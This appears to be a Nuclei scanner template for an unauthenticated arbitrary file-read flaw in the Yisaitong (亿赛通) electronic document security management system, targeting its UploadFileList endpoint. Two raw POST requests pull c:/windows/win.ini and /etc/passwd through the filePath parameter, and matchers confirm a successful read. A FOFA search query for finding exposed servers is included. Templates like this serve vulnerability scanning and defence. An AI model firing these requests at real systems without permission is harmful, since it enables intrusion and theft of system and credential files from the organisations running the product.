http:
    - matchers:
        - part: body
          type: word
          words:
            - ; for 16-bit app support
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /CDGServer3/document/UploadFileList;login HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          command=VeiwUploadFile&filePath=c:/windows/win.ini&fileName1=hello
    - matchers:
        - part: body
          regex:
            - root:.*:0:0
          type: regex
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /CDGServer3/document/UploadFileList;login HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded

          command=VeiwUploadFile&filePath=/etc/passwd&fileName1=hello
id: yisaitong-UploadFileList-File-reading
info:
    author: Superhero
    description: |-
        fofa: body="/CDGServer3/index.jsp"
        亿赛通电子文档安全管理系统 UploadFileList 接口处任意文件读取漏洞，未经身份验证的攻击者利用此漏洞获取系统内部敏感文件信息，导致系统处于极不安全的状态。
    name: 亿赛通电子文档安全管理系统 UploadFileList 任意文件读取漏洞
    reference:
        - https://blog.csdn.net/m0_60571842/article/details/141107947
    severity: high
    tags:
        - File reading
